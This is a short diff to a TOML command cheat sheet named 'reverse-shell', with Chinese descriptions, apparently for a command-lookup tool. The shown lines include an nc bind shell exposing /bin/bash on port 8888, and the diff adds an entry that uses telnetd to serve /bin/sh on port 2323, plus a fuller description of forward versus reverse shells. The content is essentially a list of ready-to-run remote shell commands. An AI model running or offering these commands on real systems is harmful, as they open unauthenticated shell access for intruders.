@@ -15,8 +15,12 @@ description = "通过 FIFO 管道反弹 shell"
 command = "nc -lp 8888 -e /bin/bash"
 description = "nc 正向监听 shell"
 
+[[hit]]
+command = "telnetd -p 2323 -l /bin/sh"
+description = "用主机提供的 telnetd 能力，将 /bin/sh 监听到某个端口，可以直接 telnet host port 连接"
+
 [meta]
 name = "reverse-shell"
-description = "常用反弹 shell 命令速查"
+description = "常用反弹 shell 命令速查；正向 shell 指设备自己监听端口，供他人连接；反向 shell 指设备向目标 host:port 发起受控请求"
 url = ""
 examples = []
